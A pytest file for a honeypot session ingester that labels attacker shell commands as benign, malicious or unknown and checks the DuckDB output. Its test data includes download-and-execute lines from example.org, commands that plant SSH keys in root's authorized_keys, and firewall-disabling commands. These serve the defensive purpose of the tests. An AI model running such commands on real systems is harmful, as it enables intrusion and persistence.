"""Behavior rules exercised through real archives, parsing, and DuckDB output."""

import json

import duckdb
import pytest
from test_shell_honeypot_sessions import ingest


@pytest.mark.parametrize(('text', 'label', 'children'), [
    ('uname -a', 'benign', ['benign']),
    ('\u00a0cat /proc/cpuinfo | grep name | wc -l', 'unknown', ['unknown'] * 3),
    ('id; whoami; pwd; arch; hostname; uptime; true; false', 'benign', ['benign'] * 8),
    ('ls -al; cat /proc/cpuinfo /etc/os-release; echo hello', 'benign', ['benign'] * 3),
    ('uname -a; wget https://example.org/p -O /tmp/x; sh /tmp/x', 'malicious', ['benign', 'malicious', 'malicious']),
    ('curl -o /tmp/x https://example.org/p && /tmp/x', 'malicious', ['malicious'] * 2),
    ('wget -O /tmp/x https://example.org/p; bash /tmp/x', 'malicious', ['malicious'] * 2),
    ('curl https://example.org/p -o /tmp/x; dash /tmp/x', 'malicious', ['malicious'] * 2),
    ('wget https://example.org/p -O /tmp/x; sh /tmp/y', 'unknown', ['unknown'] * 2),
    ('wget https://example.org/p -O /tmp/x; > /tmp/x; sh /tmp/x', 'unknown', ['unknown'] * 2),
    ('wget https://example.org/p -O /tmp/x & sh /tmp/x', 'unknown', ['unknown'] * 2),
    ('wget https://example.org/p -O /tmp/*; sh /tmp/*', 'unknown', ['unknown'] * 2),
    ('echo "ssh-ed25519 AAAA" >> /root/.ssh/authorized_keys', 'malicious', ['malicious']),
    ('echo ssh-rsa AAAA > /root/.ssh/authorized_keys', 'malicious', ['malicious']),
    ('echo ssh-ed25519 AAAA 1>> /root/.ssh/authorized_keys', 'malicious', ['malicious']),
    ('echo ssh-ed25519 AAAA 2>> /root/.ssh/authorized_keys', 'unknown', ['unknown']),
    ('echo ssh-ed25519 AAAA > /dev/null 2>> /root/.ssh/authorized_keys', 'unknown', ['unknown']),
    ('echo ssh-ed25519 AAAA > /root/.ssh/authorized_keys > /dev/null', 'unknown', ['unknown']),
    ('echo -e "\\c ssh-ed25519 AAAA" > /root/.ssh/authorized_keys', 'unknown', ['unknown']),
    ('echo "ssh-ed25519 AAAA" > /tmp/key', 'unknown', ['unknown']),
    ('iptables -F; ufw disable; setenforce 0; systemctl stop firewalld', 'malicious', ['malicious'] * 4),
    ('iptables -F; echo $(unknown_program)', 'malicious', ['malicious', 'unknown', 'unknown']),
    ('echo $(unknown_program)', 'unknown', ['unknown'] * 2),
    ('uname -a > /tmp/output', 'unknown', ['unknown']),
    ('uname; > /tmp/output', 'unknown', ['benign']),
    ('/tmp/uname -a', 'unknown', ['unknown']),
    ('f() { iptables -F; }', 'unknown', ['unknown']),
    ('PATH=/tmp iptables -F', 'unknown', ['unknown']),
    ('sh', 'unknown', ['unknown']),
    ('', 'unknown', []),
    ('echo "unterminated', 'unknown', []),
    ('wget a b c; sh /tmp/x', 'unknown', ['unknown'] * 2),
    ('wget https://example.org/p -O x; sh x', 'unknown', ['unknown'] * 2),
    ('export X=1', 'unknown', ['unknown']),
    ('echo ssh-ed25519 AAAA < /root/.ssh/authorized_keys', 'unknown', ['unknown']),
    ('cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAA comment">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~', 'malicious', ['unknown'] * 3 + ['malicious'] + ['unknown'] * 2),
    ('echo first && echo ssh-rsa AAAA 2>>.ssh/authorized_keys', 'unknown', ['benign', 'unknown']),
    ('echo first && echo ssh-rsa AAAA >>.ssh/authorized_keys > /dev/null', 'unknown', ['benign', 'unknown']),
    ('w; top; lscpu; nproc; ifconfig; which ls; crontab -l', 'benign', ['benign'] * 7),
    ('which /tmp/ls; crontab -r', 'unknown', ['unknown'] * 2),
    ('cat /proc/cpuinfo | grep name | wc -l', 'benign', ['benign'] * 3),
    ('cat /proc/cpuinfo | grep model | grep name | wc -l', 'benign', ['benign'] * 4),
    ('lscpu | grep Model', 'benign', ['benign'] * 2),
    ("df -h | head -n 2 | awk 'FNR == 2 {print $2;}'", 'benign', ['benign'] * 3),
    ('ls -lh $(which ls)', 'benign', ['benign'] * 2),
    ("free -m | grep Mem | awk '{print $2 ,$3, $4, $5, $6, $7}'", 'benign', ['benign'] * 3),
    ("cat /proc/cpuinfo | grep name | head -n 1 | awk '{print $4,$5,$6,$7,$8,$9;}'", 'benign', ['benign'] * 4),
    ('cat /proc/cpuinfo | grep name | cut -f2 -d: | uniq -c ; uname -a', 'benign', ['benign'] * 5),
    ("cat /proc/cpuinfo|grep name|cut -f2 -d':'|uniq -c ; uname -a", 'benign', ['benign'] * 5),
    ("ps | grep '[Mm]iner'", 'benign', ['benign'] * 2),
    ("ps -ef | grep '[Mm]iner'", 'benign', ['benign'] * 2),
    ('echo Hi | cat -n', 'benign', ['benign'] * 2),
    ('ls -lh $(which ls); unknown_program', 'unknown', ['unknown'] * 3),
    ("free -m | grep Mem | awk '{system(\"payload\")}'", 'unknown', ['unknown'] * 3),
])
def test_reviewed_behavior_catalogue(tmp_path, text, label, children):
    """Complete input and individual invocations retain their own behavior labels."""
    root, database = ingest(tmp_path, {
        'dataset/sessions/2021_2022.jsonl': [{'src_ip': '192.0.2.1', 'commands': [text]}],
    })
    with duckdb.connect(str(database)) as con:
        assert con.execute('SELECT shell_input,dataset_label FROM SHELL_INPUTS').fetchall() == [(text, label)]
        assert [row[0] for row in con.execute('SELECT dataset_label FROM PROCESS_LAUNCHES ORDER BY record_id').fetchall()] == children
    audit = [json.loads(line) for line in (root / 'import-audit.jsonl').read_text().splitlines()]
    assert len([row for row in audit if row['action'] == 'emit']) == 1


def test_replay_scores_cannot_override_behavior_or_match_changed_text(tmp_path):
    """Failed attacks stay malicious; conflicting scores remain available for review."""
    root, database = ingest(tmp_path, {
        'dataset/sessions/2021_2022.jsonl': [{'src_ip': '192.0.2.1', 'commands': ['iptables -F', 'sh', 'uname -a']}],
        'dataset/request_response/curated.jsonl': [
            {'session_id': 'replay', 'turn_index': 1, 'command': 'iptables -F', 'severity_vi': 0},
            {'session_id': 'replay', 'turn_index': 2, 'command': 'iptables -F', 'severity_vi': 5},
            {'session_id': 'replay', 'turn_index': 3, 'command': 'sh', 'severity_vi': 2},
        ],
        'dataset/request_response/vm_replay_2021_2022.jsonl': [
            {'session_id': 'replay', 'turn_index': 1, 'command': 'uname -a'},
        ],
    })
    with duckdb.connect(str(database)) as con:
        assert dict(con.execute('SELECT shell_input,dataset_label FROM SHELL_INPUTS').fetchall()) == {
            'iptables -F': 'malicious', 'sh': 'unknown', 'uname -a': 'benign',
        }
    audit = [json.loads(line) for line in (root / 'import-audit.jsonl').read_text().splitlines()]
    assert any(row['reason'] == 'changed-replay-text' for row in audit)
    emitted = [row for row in audit if row['action'] == 'emit']
    assert [reference['severity'] for reference in emitted[0]['replay_references']] == [0, 5]
    assert emitted[2]['replay_references'] == []
    summary = json.loads((root / 'import-summary.json').read_text())
    assert summary['counts']['conflicting-replay-scores'] == 1
